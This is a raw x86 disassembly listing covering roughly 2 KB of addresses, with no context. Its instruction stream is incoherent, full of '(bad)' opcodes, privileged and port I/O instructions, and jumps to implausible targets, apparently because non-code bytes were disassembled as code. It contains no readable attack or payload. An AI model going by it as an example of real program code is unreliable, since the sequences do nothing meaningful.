  42d8fe:	mov    bh,BYTE PTR fs:[ecx-0xc]
  42d902:	jns    0x42d90f
  42d904:	js     0x42d893
  42d906:	aam    0xf6
  42d908:	les    eax,FWORD PTR [esi+edx*1-0x23]
  42d90c:	add    al,0x93
  42d90e:	retf   
  42d90f:	mov    ah,0xf0
  42d911:	xchg   WORD PTR ds:0x6105f677,bx
  42d918:	or     ebx,DWORD PTR [edx-0x4f]
  42d91b:	cmc    
  42d91c:	std    
  42d91d:	int    0x48
  42d91f:	std    
  42d920:	sbb    BYTE PTR fs:[edi-0x71],al
  42d924:	dec    ebp
  42d925:	(bad)
  42d92a:	add    BYTE PTR [esi+0x3394135],ah
  42d930:	cmp    eax,0x1351742b
  42d935:	add    ch,BYTE PTR [eax+eax*1]
  42d938:	pop    esp
  42d939:	shl    BYTE PTR [ebx+0x64c4ec24],1
  42d93f:	add    edx,ecx
  42d941:	jmp    0x42d953
  42d943:	or     DWORD PTR [esi+0x6ff3b8a0],0xa1163683
  42d94d:	adc    BYTE PTR [ebx-0x2],bh
  42d950:	outs   dx,BYTE PTR ds:[esi]
  42d951:	adc    eax,0xc4eff7ac
  42d956:	fdivr  st,st(6)
  42d958:	dec    ebx
  42d959:	mov    al,0xb
  42d95b:	(bad)  
  42d95c:	imul   BYTE PTR [ecx-0x4f9bb5c8]
  42d962:	pop    es
  42d963:	sbb    ebp,DWORD PTR [eax+ebp*2+0x26]
  42d967:	aam    0x5b
  42d969:	sub    al,0x4b
  42d96b:	mov    al,0x6
  42d96d:	and    al,0x2c
  42d96f:	sbb    eax,0xe2fe602c
  42d974:	adc    ch,BYTE PTR [edx+eiz*4-0x4766e029]
  42d97b:	dec    esi
  42d97c:	(bad)
  42d980:	mov    ch,0x9
  42d982:	ins    BYTE PTR es:[edi],dx
  42d983:	fisub  WORD PTR [ebx+eiz*1]
  42d986:	adc    dh,BYTE PTR [esi+0x20]
  42d989:	mov    bh,0x98
  42d98b:	(bad)  
  42d98c:	shr    BYTE PTR [eax+0x9],1
  42d98f:	shl    DWORD PTR [eax+0x6e095b1d],0xc
  42d996:	mov    WORD PTR [ebp-0x5d3ade1f],ss
  42d99c:	sub    al,0x95
  42d99e:	sar    DWORD PTR [ebp+0x44dc83d1],1
  42d9a4:	add    DWORD PTR [edx-0x60ca7929],edx
  42d9aa:	imul   eax,DWORD PTR [eax-0x2b991915],0xac823f5c
  42d9b4:	rcr    dh,1
  42d9b6:	aaa    
  42d9b7:	pop    edi
  42d9b8:	xchg   DWORD PTR [ebx],esp
  42d9ba:	mov    dh,BYTE PTR [edx-0x7a6025e]
  42d9c0:	xor    DWORD PTR [ecx+0x2b],esi
  42d9c3:	push   ebx
  42d9c4:	mov    edx,0x6b9833b3
  42d9c9:	gs push esi
  42d9cb:	pushf  
  42d9cc:	xor    BYTE PTR [ecx],0xad
  42d9cf:	push   ss
  42d9d0:	mov    al,ds:0x2c889062
  42d9d5:	add    al,0x82
  42d9d7:	fisub  DWORD PTR [eax-0x7b]
  42d9da:	lods   eax,DWORD PTR ds:[esi]
  42d9db:	aam    0x8e
  42d9dd:	in     eax,0x50
  42d9df:	inc    edi
  42d9e0:	lahf   
  42d9e1:	jb     0x42d9e3
  42d9e3:	addr16 jle 0x42d9d6
  42d9e6:	dec    ebp
  42d9e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d9e8:	jecxz  0x42da13
  42d9ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d9eb:	adc    ecx,DWORD PTR [bx+si]
  42d9ee:	mov    ch,0xd6
  42d9f0:	and    esp,ebx
  42d9f2:	adc    DWORD PTR [ebp-0x57],eax
  42d9f5:	pushf  
  42d9f6:	inc    eax
  42d9f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d9f8:	aas    
  42d9f9:	(bad)
  42d9fd:	xor    eax,0x68be6d82
  42da02:	or     ebp,eax
  42da04:	lds    esp,FWORD PTR ds:0x42f24494
  42da0a:	scas   eax,DWORD PTR es:[edi]
  42da0b:	sbb    eax,0xc21c1f0d
  42da10:	hlt    
  42da11:	dec    edi
  42da12:	adc    DWORD PTR [ebx-0x5],0xd93e5b81
  42da19:	dec    eax
  42da1a:	mov    BYTE PTR [ecx-0xf0230e7],ah
  42da20:	cmp    BYTE PTR [esi-0x23dd4a17],ch
  42da26:	sbb    al,0x80
  42da28:	cmp    eax,0xf3d18758
  42da2d:	pop    ecx
  42da2e:	les    ecx,FWORD PTR [edi+0x4e]
  42da31:	ret    0x2edb
  42da34:	and    DWORD PTR [ecx+0x5b],edx
  42da37:	xor    DWORD PTR [esi-0x4ac3df0a],0x14
  42da3e:	adc    al,0x4b
  42da40:	add    eax,0x48481bd1
  42da45:	add    eax,0x6979985c
  42da4a:	mov    cs,WORD PTR [esi]
  42da4c:	xchg   ebx,eax
  42da4d:	add    ebp,ecx
  42da4f:	jmp    0x831ab76e
  42da54:	test   BYTE PTR [ebp-0x2d1d9ec9],0x11
  42da5b:	sub    al,0x4c
  42da5d:	popf   
  42da5e:	(bad)  
  42da5f:	mov    ch,0x1f
  42da61:	stos   DWORD PTR es:[edi],eax
  42da62:	shr    DWORD PTR [edx+0x3b],0x80
  42da66:	mov    dh,dl
  42da68:	cmp    bl,dh
  42da6a:	mov    eax,0xffe63f73
  42da6f:	js     0x42dacd
  42da71:	popf   
  42da72:	nop
  42da73:	and    eax,ebp
  42da75:	sub    eax,0x17a0e7c4
  42da7a:	mov    al,0xb0
  42da7c:	inc    edi
  42da7d:	cmp    al,0x0
  42da7f:	cmp    eax,0x8c301db6
  42da84:	lahf   
  42da85:	jmp    0x42da44
  42da87:	add    DWORD PTR ds:0x475395dd,edi
  42da8d:	cdq    
  42da8e:	sbb    cl,BYTE PTR [ebx+0x44842573]
  42da94:	lods   eax,DWORD PTR ds:[esi]
  42da95:	jg     0x42da5e
  42da97:	data16 adc al,0x1e
  42da9a:	(bad)  
  42da9b:	sub    BYTE PTR [esi+edi*8],ch
  42da9e:	pop    ebp
  42da9f:	mov    BYTE PTR [edi-0x6c0d7027],bl
  42daa5:	lahf   
  42daa6:	inc    ebp
  42daa7:	xchg   ebp,eax
  42daa8:	es into 
  42daaa:	rol    DWORD PTR [ebp-0x4d],1
  42daad:	sbb    al,0xe9
  42daaf:	sbb    bl,0xde
  42dab2:	mov    esi,DWORD PTR [ebx-0x529e1b31]
  42dab8:	into   
  42dab9:	rcl    BYTE PTR [edi],0x96
  42dabc:	push   ecx
  42dabd:	clc    
  42dabe:	in     al,0xab
  42dac0:	sub    eax,DWORD PTR [edi-0x4e534a6a]
  42dac6:	dec    ebx
  42dac7:	xchg   ebx,eax
  42dac8:	clc    
  42dac9:	xlat   BYTE PTR ds:[ebx]
  42daca:	sti    
  42dacb:	push   ebp
  42dacc:	rdmsr  
  42dace:	call   FWORD PTR [eax-0x1917503b]
  42dad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dad5:	fdivr  st(2),st
  42dad7:	shr    DWORD PTR [edi],0x43
  42dada:	vmwrite ebp,DWORD PTR [edx]
  42dadd:	shl    BYTE PTR ds:0x8db2c737,1
  42dae3:	data16 mov ?,WORD PTR [ecx]
  42dae6:	mov    ebx,0xec901d8f
  42daeb:	shl    BYTE PTR [ebx+0x61],1
  42daee:	ret    
  42daef:	jns    0x42daf0
  42daf1:	inc    esi
  42daf2:	push   ebx
  42daf3:	nop
  42daf4:	jmp    0x42dafe
  42daf6:	sbb    dh,bh
  42daf8:	sti    
  42daf9:	mov    ch,0xfb
  42dafb:	gs mov ah,0xb1
  42dafe:	mov    ebp,ebx
  42db00:	xor    eax,0x603faf43
  42db05:	pop    ds
  42db06:	adc    dh,BYTE PTR [edi-0x112850e2]
  42db0c:	aad    0x3
  42db0e:	mov    ebp,0xbb59b844
  42db13:	out    0xce,al
  42db15:	cli    
  42db16:	in     eax,0x8b
  42db18:	es mov bh,0x45
  42db1b:	pusha  
  42db1c:	sti    
  42db1d:	cmp    edx,DWORD PTR [edx+0x2d]
  42db20:	imul   esi,edi,0x22
  42db23:	xor    DWORD PTR [eax],edi
  42db25:	mov    DWORD PTR [ecx+0x65785313],ebp
  42db2b:	push   DWORD PTR [edx+ebp*8]
  42db2e:	popf   
  42db2f:	adc    eax,0x4c4533a4
  42db34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42db35:	mov    ch,BYTE PTR [edx+0x2b]
  42db38:	in     eax,dx
  42db39:	push   edi
  42db3a:	xor    esp,DWORD PTR [esi+0x28]
  42db3d:	mov    bl,0x29
  42db3f:	test   cl,ch
  42db41:	add    BYTE PTR [ecx],bh
  42db43:	pushf  
  42db44:	push   cs
  42db45:	int3   
  42db46:	xchg   edx,eax
  42db47:	or     eax,0x8fcdbbb1
  42db4c:	imul   esi,DWORD PTR [edi+0x4f72d004],0x4
  42db53:	fldcw  WORD PTR [ebx]
  42db55:	mov    esi,DWORD PTR [eax-0x6fb5ee]
  42db5b:	jle    0x42db67
  42db5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42db5e:	mov    al,ds:0xb5a4e0b3
  42db63:	mov    ch,0xe7
  42db65:	loop   0x42db0f
  42db67:	mov    eax,0x792e7f76
  42db6c:	push   ds
  42db6d:	xlat   BYTE PTR ds:[ebx]
  42db6e:	out    0xbd,al
  42db70:	or     edi,DWORD PTR [edx+0x73]
  42db73:	pop    ecx
  42db74:	jbe    0x42db00
  42db76:	mov    dl,0x13
  42db78:	cwde   
  42db79:	or     DWORD PTR [eax+0x1a],esp
  42db7c:	mov    eax,ds:0x358a1bf3
  42db81:	out    dx,eax
  42db82:	sti    
  42db83:	push   0x77d7b20f
  42db88:	arpl   cx,sp
  42db8a:	int    0x4
  42db8c:	mov    dl,0x67
  42db8e:	loop   0x42db98
  42db90:	cwde   
  42db91:	inc    esp
  42db92:	jno    0x42db46
  42db94:	test   BYTE PTR [esi+ebx*4-0x4c],dh
  42db98:	jns    0x42db5e
  42db9a:	inc    ecx
  42db9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42db9c:	pop    edi
  42db9d:	cmp    eax,0x50c6f6ea
  42dba2:	leave  
  42dba3:	leave  
  42dba4:	mov    ah,0x27
  42dba6:	or     edi,DWORD PTR [eax]
  42dba8:	cli    
  42dba9:	test   DWORD PTR [ebx],esi
  42dbab:	mov    BYTE PTR ds:0x9c36303b,dh
  42dbb1:	test   ebp,ecx
  42dbb3:	inc    ecx
  42dbb4:	ret    0x3e82
  42dbb7:	push   edi
  42dbb8:	mov    ch,0x8b
  42dbba:	test   BYTE PTR [edi+0x42],cl
  42dbbd:	cmp    DWORD PTR [edx+0x59b4e81],esp
  42dbc3:	mov    ecx,esi
  42dbc5:	xor    al,BYTE PTR [esi+0x27]
  42dbc8:	stos   BYTE PTR es:[edi],al
  42dbc9:	lock push es
  42dbcb:	sub    al,0xf0
  42dbcd:	das    
  42dbce:	in     eax,0x51
  42dbd0:	xor    DWORD PTR [ebx-0x3f4cdea0],ebx
  42dbd6:	sub    DWORD PTR [edx],ebp
  42dbd8:	pop    ds
  42dbd9:	repz cmp BYTE PTR gs:[ebx+0x3d],bl
  42dbde:	pop    eax
  42dbdf:	cmc    
  42dbe0:	xchg   ebp,eax
  42dbe1:	xor    eax,0x6993ff64
  42dbe6:	call   0xd60b2be9
  42dbeb:	xor    al,0xde
  42dbed:	mov    ah,0x6e
  42dbef:	lds    ebx,FWORD PTR [ecx-0x18]
  42dbf2:	ins    DWORD PTR es:[edi],dx
  42dbf3:	rol    bh,1
  42dbf5:	xor    eax,0x87bcc0a5
  42dbfa:	sbb    al,0x19
  42dbfc:	bound  eax,QWORD PTR [ebp-0x3d]
  42dbff:	adc    eax,0x544fbc90
  42dc04:	pop    ds
  42dc05:	add    BYTE PTR [ebx],bh
  42dc07:	mov    DWORD PTR [eax-0x5f],edi
  42dc0a:	popf   
  42dc0b:	fisub  DWORD PTR [eax+0x39]
  42dc0e:	int    0x91
  42dc10:	inc    ebx
  42dc11:	add    BYTE PTR [edx+0x48db811],0xc0
  42dc18:	icebp  
  42dc19:	out    dx,eax
  42dc1a:	inc    BYTE PTR [edi]
  42dc1c:	sub    al,0x76
  42dc1e:	sub    esp,edx
  42dc20:	and    ah,BYTE PTR [ecx]
  42dc22:	arpl   di,si
  42dc24:	sub    ah,BYTE PTR [edi+edx*1+0x53]
  42dc28:	sub    BYTE PTR [ebx+eiz*8-0x10],ah
  42dc2c:	inc    esi
  42dc2d:	mov    ebx,0x93cc4c51
  42dc32:	mov    ah,0x5b
  42dc34:	inc    esp
  42dc35:	(bad)  [esi-0x51e4dfa]
  42dc3b:	push   ebp
  42dc3c:	or     edi,0xffffffea
  42dc3f:	xchg   ecx,eax
  42dc40:	sar    cl,1
  42dc42:	ror    BYTE PTR [ebx+0x18],1
  42dc45:	js     0x42dcc5
  42dc47:	or     ecx,DWORD PTR [ecx-0x4c]
  42dc4a:	inc    esi
  42dc4b:	xor    al,0x6e
  42dc4d:	ins    DWORD PTR es:[edi],dx
  42dc4e:	ret    0xffab
  42dc51:	jb     0x42dc64
  42dc53:	(bad)
  42dc56:	ins    BYTE PTR es:[edi],dx
  42dc57:	fs out 0xb9,eax
  42dc5a:	jge    0x42dc8a
  42dc5c:	hlt    
  42dc5d:	dec    edi
  42dc5e:	pop    eax
  42dc5f:	mov    cl,0x69
  42dc61:	mov    ch,0x5
  42dc63:	(bad)  
  42dc64:	adc    DWORD PTR ds:[edi-0x3c],eax
  42dc68:	pop    ecx
  42dc69:	inc    ebp
  42dc6a:	mov    al,ds:0x55be8631
  42dc6f:	lods   eax,DWORD PTR ds:[esi]
  42dc70:	or     dl,bh
  42dc72:	push   0x50e63bd1
  42dc77:	retf   0xd09a
  42dc7a:	mov    bl,0x37
  42dc7c:	mov    ah,ch
  42dc7e:	jl     0x42dc86
  42dc80:	fiadd  WORD PTR [esi]
  42dc82:	or     DWORD PTR [esi-0x59],ecx
  42dc85:	cmp    al,0xd7
  42dc88:	xchg   ebx,eax
  42dc89:	lock cld 
  42dc8b:	lds    esi,FWORD PTR [esi+0x38]
  42dc8e:	fisub  DWORD PTR [ebx]
  42dc90:	xor    BYTE PTR ds:0xfb2634f1,bh
  42dc96:	jb     0x42dd00
  42dc98:	mov    esi,0xb93509bd
  42dc9d:	or     edi,ebp
  42dc9f:	test   ebp,0x59e2f2a2
  42dca5:	jne    0x42dce9
  42dca7:	cli    
  42dca8:	mov    eax,ds:0x770e7e6b
  42dcad:	xor    DWORD PTR [edi],ebx
  42dcaf:	shl    BYTE PTR ds:[bx+di-0x188a],0xca
  42dcb6:	cs sbb esi,esp
  42dcb9:	mov    al,0x16
  42dcbb:	jmp    FWORD PTR [esi+0x6c]
  42dcbe:	sbb    al,0xc2
  42dcc0:	stc    
  42dcc1:	loopne 0x42dce9
  42dcc3:	dec    ebp
  42dcc4:	dec    eax
  42dcc5:	stos   BYTE PTR es:[edi],al
  42dcc6:	ss icebp 
  42dcc8:	ret    
  42dcc9:	cpuid  
  42dccb:	jl     0x42dca8
  42dccd:	jbe    0x42dd11
  42dccf:	inc    edi
  42dcd0:	mov    ebx,0x7b37e571
  42dcd5:	nop
  42dcd6:	cmp    al,0x54
  42dcd8:	xor    BYTE PTR ds:0x7cc1e648,0x10
  42dcdf:	imul   ecx,DWORD PTR [eax],0xffffffd6
  42dce2:	jnp    0x42dcc0
  42dce4:	jae    0x42dc7e
  42dce6:	cmp    bh,ch
  42dce8:	test   BYTE PTR [edi-0x4cf5fc9f],ch
  42dcee:	arpl   WORD PTR [eax],cx
  42dcf0:	jbe    0x42dcac
  42dcf2:	push   ecx
  42dcf3:	xlat   BYTE PTR ds:[ebx]
  42dcf4:	rol    DWORD PTR [ebp+0x5c3fadb1],cl
  42dcfa:	rcr    esp,1
  42dcfc:	sub    al,0x0
  42dcfe:	fadd   DWORD PTR [esi+0x7b0769cf]
  42dd04:	mov    BYTE PTR [esi],dl
  42dd06:	es xchg edi,eax
  42dd08:	sar    bl,cl
  42dd0a:	mov    ebx,0x19778e71
  42dd0f:	jp     0x42dd90
  42dd11:	jnp    0x42dd1e
  42dd13:	je     0x42dce7
  42dd15:	inc    edi
  42dd16:	(bad)  
  42dd17:	out    dx,al
  42dd18:	sbb    al,0xcb
  42dd1a:	out    0x4e,al
  42dd1c:	mov    esi,0x67f0026c
  42dd21:	mov    ecx,0xd6d1b725
  42dd26:	aaa    
  42dd27:	call   0x33ae:0x254c9c0a
  42dd2e:	add    bl,BYTE PTR [ebp+0x6a1b8c02]
  42dd34:	mov    dl,0x63
  42dd36:	xchg   ecx,eax
  42dd37:	jmp    0x42dd23
  42dd39:	mov    ecx,0x7b59b834
  42dd3e:	push   es
  42dd3f:	out    dx,al
  42dd40:	sub    al,0xdd
  42dd42:	mov    al,ds:0x2d6d8509
  42dd47:	pop    eax
  42dd48:	mov    cl,0xc3
  42dd4a:	sub    ch,BYTE PTR [edi]
  42dd4c:	fld    QWORD PTR [esi-0x26f1518c]
  42dd52:	xchg   esp,eax
  42dd53:	sbb    DWORD PTR [ebp+0x7f070a62],esi
  42dd59:	fmul   DWORD PTR [edi+0x230d50f6]
  42dd5f:	adc    ebx,DWORD PTR [ecx]
  42dd61:	xchg   esp,eax
  42dd62:	retf   
  42dd63:	xor    eax,0x3275e8d4
  42dd68:	pop    esi
  42dd69:	and    al,0x4d
  42dd6b:	outs   dx,BYTE PTR ds:[esi]
  42dd6c:	inc    ecx
  42dd6d:	outs   dx,BYTE PTR ds:[esi]
  42dd6e:	test   eax,0xbc3bbb80
  42dd73:	enter  0x1648,0x5c
  42dd77:	dec    ecx
  42dd78:	adc    al,0xf1
  42dd7a:	div    BYTE PTR [ebp-0x14ba0f8c]
  42dd80:	mov    eax,0xe8c26ebf
  42dd85:	imul   esi,DWORD PTR [edx],0xfffffffc
  42dd88:	pop    ebx
  42dd89:	or     ch,al
  42dd8b:	mov    eax,0x64a98ff
  42dd90:	sub    cl,BYTE PTR [ebp+edx*8+0x31]
  42dd94:	ins    DWORD PTR es:[edi],dx
  42dd95:	fisub  WORD PTR [esi]
  42dd97:	mov    ch,0x79
  42dd99:	loopne 0x42dde9
  42dd9b:	dec    ecx
  42dd9c:	xchg   edx,eax
  42dd9d:	es rcr al,0x77
  42dda1:	mov    cl,0xa8
  42dda3:	lods   eax,DWORD PTR ds:[esi]
  42dda4:	and    eax,DWORD PTR [edi+0x3d]
  42dda7:	mov    WORD PTR [ecx+ebp*1],fs
  42ddaa:	ins    DWORD PTR es:[edi],dx
  42ddab:	mov    eax,0x2717e5ba
  42ddb0:	std    
  42ddb1:	lods   al,BYTE PTR ds:[esi]
  42ddb2:	stc    
  42ddb3:	pusha  
  42ddb4:	aaa    
  42ddb5:	xor    bl,bl
  42ddb7:	push   edi
  42ddb8:	arpl   si,bp
  42ddba:	in     al,dx
  42ddbb:	and    al,0x82
  42ddbd:	popa   
  42ddbe:	xor    ebx,ecx
  42ddc0:	cli    
  42ddc1:	or     eax,ebx
  42ddc3:	imul   esp,DWORD PTR [esi],0xffffffc8
  42ddc6:	or     DWORD PTR cs:[ebp-0x65],ebp
  42ddca:	or     BYTE PTR [eax+0xe61992f],0x78
  42ddd1:	loope  0x42de40
  42ddd3:	icebp  
  42ddd4:	rcr    BYTE PTR [eax],1
  42ddd6:	dec    eax
  42ddd7:	push   0xd8c312dc
  42dddc:	xchg   ebx,eax
  42dddd:	out    0x31,eax
  42dddf:	jnp    0x42de4d
  42dde1:	push   ds
  42dde2:	(bad)  
  42dde4:	mov    sp,0x7076
  42dde8:	or     ecx,edx
  42ddea:	push   cs
  42ddeb:	daa    
  42ddec:	xor    bh,BYTE PTR [ecx+0x7d77a0c]
  42ddf2:	xor    BYTE PTR [esi],bh
  42ddf4:	pop    edx
  42ddf5:	and    BYTE PTR [ebx+0x7bbe86a7],dh
  42ddfb:	cmp    BYTE PTR [eax-0x6],0xeb
  42ddff:	repz test al,0x6b
  42de02:	jne    0x42dda4
  42de04:	mov    bl,0xc9
  42de06:	mov    ecx,es
  42de08:	xchg   ebx,eax
  42de09:	sbb    DWORD PTR [edi+eax*8+0x2c],esi
  42de0d:	push   eax
  42de0e:	mov    dl,0x32
  42de10:	popf   
  42de11:	fwait
  42de12:	adc    ah,BYTE PTR [edx-0x9]
  42de15:	outs   dx,DWORD PTR ds:[esi]
  42de16:	inc    esp
  42de17:	rol    DWORD PTR [edi-0x52],cl
  42de1a:	xchg   DWORD PTR [ebx+edi*4],ebx
  42de1d:	xchg   esi,esi
  42de1f:	mov    BYTE PTR [edi],cl
  42de21:	push   ebp
  42de22:	repz cmp bh,ah
  42de25:	push   ecx
  42de26:	(bad)  
  42de27:	xor    eax,0xa4741cff
  42de2c:	xchg   ebx,eax
  42de2d:	test   dh,ch
  42de2f:	fnstsw ax
  42de31:	mov    bl,0xcd
  42de33:	add    bl,BYTE PTR [edi+0x2754f029]
  42de39:	mov    al,ds:0xc6365357
  42de3e:	pushw  cs
  42de40:	inc    ebp
  42de41:	call   0xb9f1e92
  42de46:	and    BYTE PTR [edx-0x46],dh
  42de49:	outs   dx,DWORD PTR ds:[esi]
  42de4a:	scas   al,BYTE PTR es:[edi]
  42de4b:	ja     0x42de0e
  42de4d:	aas    
  42de4e:	repz add bl,BYTE PTR [esi-0x6]
  42de52:	int3   
  42de53:	(bad)  
  42de54:	adc    DWORD PTR [ebp-0x29],ebx
  42de57:	(bad)  
  42de58:	in     al,dx
  42de59:	in     al,dx
  42de5a:	adc    bl,dl
  42de5c:	mov    dh,0xb7
  42de5e:	pusha  
  42de5f:	outs   dx,BYTE PTR ds:[esi]
  42de60:	jl     0x42de80
  42de62:	push   esi
  42de63:	xchg   ebx,eax
  42de64:	inc    esp
  42de65:	xor    dh,cl
  42de67:	dec    esp
  42de68:	mov    dh,0xca
  42de6a:	sbb    BYTE PTR [esi+ebp*1+0x17],bl
  42de6e:	call   0x469d:0x2940b436
  42de75:	pop    edi
  42de76:	mov    eax,0x7b5bc48c
  42de7b:	call   0xa5d05df1
  42de80:	mov    bl,0x9f
  42de82:	ret    0xf9f8
  42de85:	jns    0x42de0b
  42de87:	sbb    esp,DWORD PTR [ebp+0x1c]
  42de8a:	std    
  42de8b:	(bad)  [ecx-0x8]
  42de8e:	leave  
  42de8f:	out    0x5f,al
  42de91:	mov    edx,0xb27a8f34
  42de96:	lea    edi,[ecx+esi*1+0x1b3ea217]
  42de9d:	dec    edx
  42de9e:	xchg   ebx,eax
  42de9f:	mov    edx,DWORD PTR [eax-0x30ef9b72]
  42dea5:	push   esp
  42dea6:	adc    BYTE PTR [esi+0x77],bh
  42dea9:	pop    ds
  42deaa:	dec    esi
  42deab:	lahf   
  42deac:	test   al,0xa1
  42deae:	xchg   ebx,eax
  42deaf:	push   ss
  42deb0:	xlat   BYTE PTR ds:[ebx]
  42deb1:	sbb    eax,0xaa6cc3f3
  42deb6:	pusha  
  42deb7:	mov    esi,0x2f26a8bf
  42debc:	inc    edi
  42debd:	cmp    dl,BYTE PTR [edx+edi*8]
  42dec0:	mov    ss,WORD PTR ds:0x4826be91
  42dec6:	mov    ?,WORD PTR [edx+0xc]
  42dec9:	mov    edi,0x6666449e
  42dece:	push   es
  42decf:	sub    eax,0xad24d0b7
  42ded4:	fild   WORD PTR [edi+0x3ff89fcb]
  42deda:	enter  0xb70e,0x63
  42dede:	out    0xd9,al
  42dee0:	adc    ebp,DWORD PTR [ebx]
  42dee2:	jno    0x42dec5
  42dee4:	jns    0x42df33
  42dee6:	jmp    0x432a:0xfca7422d
  42deed:	cvtdq2ps xmm5,XMMWORD PTR [ebp+0x6b]
  42def1:	or     esp,DWORD PTR [ecx+0x5f]
  42def4:	outs   dx,DWORD PTR ds:[esi]
  42def5:	sbb    ebp,DWORD PTR [edx-0x3a3e7b6e]
  42defb:	add    bl,BYTE PTR [edx+0x8]
  42defe:	mov    ?,WORD PTR [ecx+0x244e64fd]
  42df04:	stos   DWORD PTR es:[edi],eax
  42df05:	cwde   
  42df06:	dec    esi
  42df07:	in     al,0xe1
  42df09:	xor    ecx,DWORD PTR [ebx+0x6a]
  42df0c:	xchg   edi,eax
  42df0d:	loopne 0x42df71
  42df0f:	push   ebp
  42df10:	xchg   BYTE PTR [ecx+0x43a890cc],cl
  42df16:	inc    edx
  42df17:	mov    dh,BYTE PTR [esi]
  42df19:	data16 arpl WORD PTR [esi+0x4a5648e],dx
  42df20:	jmp    0xd7045706
  42df25:	fmul   DWORD PTR [eax]
  42df27:	jg     0x42df9c
  42df29:	das    
  42df2a:	push   cs
  42df2b:	jle    0x42df12
  42df2d:	add    ecx,eax
  42df2f:	int    0x25
  42df31:	loopne 0x42df7e
  42df33:	xchg   edi,eax
  42df34:	loope  0x42df1e
  42df36:	jbe    0x42df5a
  42df38:	xchg   ecx,eax
  42df39:	mov    bl,0x23
  42df3b:	jbe    0x42deda
  42df3d:	add    al,0xf9
  42df3f:	push   edx
  42df40:	add    eax,0x2277d5fe
  42df45:	mov    ah,0xfe
  42df47:	sbb    dl,ah
  42df49:	mov    dl,0x27
  42df4b:	xchg   ecx,eax
  42df4c:	sbb    al,0x5e
  42df4e:	inc    eax
  42df4f:	fs ret 
  42df51:	push   0x4c
  42df53:	ins    DWORD PTR es:[edi],dx
  42df54:	jge    0x42dfba
  42df56:	and    eax,0x43ac48e9
  42df5b:	jecxz  0x42df1a
  42df5d:	pop    ebp
  42df5e:	cwde   
  42df5f:	jnp    0x42dfdb
  42df61:	push   0x239544a5
  42df66:	sbb    cl,ah
  42df68:	ins    BYTE PTR es:[edi],dx
  42df69:	jae    0x42df50
  42df6b:	push   DWORD PTR [ecx-0xb]
  42df6e:	push   ds
  42df6f:	pusha  
  42df70:	jbe    0x42df09
  42df72:	gs fdivp st(7),st
  42df75:	out    0xf4,eax
  42df77:	fisub  WORD PTR [esi-0x32]
  42df7a:	pushf  
  42df7b:	xor    edi,DWORD PTR [ebp+0x12649925]
  42df81:	ror    BYTE PTR [ebx],cl
  42df83:	sub    eax,0x20220094
  42df88:	mov    al,bl
  42df8a:	adc    DWORD PTR [edi],edx
  42df8c:	mov    ebx,0xb5f5776b
  42df91:	in     eax,dx
  42df92:	ficomp DWORD PTR [esi-0x9]
  42df95:	mov    ch,0xed
  42df97:	mov    esi,0xacabaafa
  42df9c:	mov    ebx,0x1596b2ab
  42dfa1:	pop    ecx
  42dfa2:	add    eax,0x4b290141
  42dfa7:	or     eax,0x90920490
  42dfac:	fisub  WORD PTR [esi-0x6e]
  42dfaf:	jmp    0xdf37c631
  42dfb4:	push   edi
  42dfb6:	out    dx,eax
  42dfb7:	in     al,0xf7
  42dfb9:	int3   
  42dfba:	sbb    edi,edi
  42dfbc:	pop    esp
  42dfbd:	xlat   BYTE PTR ds:[ebx]
  42dfbe:	pop    esp
  42dfbf:	xor    eax,DWORD PTR [ebx-0x32]
  42dfc2:	cld    
  42dfc3:	retf   0xdcf3
  42dfc6:	in     eax,0xfb
  42dfc8:	mov    ebp,0x38d0bb9f
  42dfcd:	aad    0x50
  42dfcf:	xchg   ebp,eax
  42dfd0:	(bad)  
  42dfd4:	dec    edx
  42dfd5:	fbstp  TBYTE PTR [ebx+0x46481a29]
  42dfdb:	gs cmp eax,0x516a4cae
  42dfe1:	aad    0x71
  42dfe3:	retf   0x2a2b
  42dfe6:	or     BYTE PTR [edx+ebx*8-0x7f27563d],ch
  42dfed:	push   ecx
  42dfee:	mov    edi,0xd6f2f296
  42dff3:	adc    eax,0x8752a37f
  42dff8:	push   edi
  42dff9:	and    bl,BYTE PTR [eax+0x1271a0e]
  42dfff:	pop    ebp
  42e000:	xor    al,0x2a
  42e002:	dec    edx
  42e003:	jmp    0x42df88
  42e005:	inc    eax
  42e006:	push   edi
  42e007:	pop    ebp
  42e008:	mov    esp,0x77a9e970
  42e00d:	push   eax
  42e00e:	enter  0x89bb,0xce
  42e012:	xchg   esp,eax
  42e013:	mov    BYTE PTR [esi-0x78],bl
  42e016:	pusha  
  42e017:	pop    ss
  42e018:	into   
  42e019:	jl     0x42e017
  42e01b:	rcr    DWORD PTR [ecx],1
  42e01d:	mov    dl,0xa9
  42e01f:	mov    WORD PTR [eax],?
  42e021:	xchg   ebx,eax
  42e022:	xor    bh,BYTE PTR [esi]
  42e024:	xchg   esi,edx
  42e026:	cmp    al,0x35
  42e028:	iret   
  42e029:	xchg   ecx,eax
  42e02a:	leave  
  42e02b:	sub    al,0x56
  42e02d:	xchg   ecx,eax
  42e02e:	mov    edx,DWORD PTR [esp+eiz*4+0x54]
  42e032:	outs   dx,DWORD PTR ds:[esi]
  42e033:	call   0xa448:0xff3c53b2
  42e03a:	ror    BYTE PTR [esi-0x1998c882],0x8a
  42e041:	mov    esp,0xdeb20be9
  42e046:	ins    DWORD PTR es:[edi],dx
  42e047:	push   edi
  42e048:	nop
  42e049:	sahf   
  42e04a:	retf   0x7812
  42e04d:	sar    DWORD PTR ds:0x383a75ec,cl
  42e053:	in     eax,0xb4
  42e055:	push   eax
  42e056:	pop    eax
  42e057:	dec    edx
  42e058:	(bad)  
  42e059:	xlat   BYTE PTR ds:[ebx]
  42e05a:	dec    esp
  42e05b:	dec    ebp
  42e05c:	(bad)  
  42e05d:	sbb    ah,BYTE PTR [ebp-0x2a1205af]
  42e063:	lea    eax,[ebx+0x13]
  42e066:	or     eax,0xe11aa01a
  42e06b:	inc    edx
  42e06c:	mov    ds:0xfde2be35,eax
  42e071:	or     al,BYTE PTR [ecx]
  42e073:	push   0xb7d97fca
  42e078:	mov    bh,0xe1
  42e07a:	adc    eax,0xba74b3a3
  42e07f:	test   ecx,edx
  42e081:	aas    
  42e082:	pop    ds
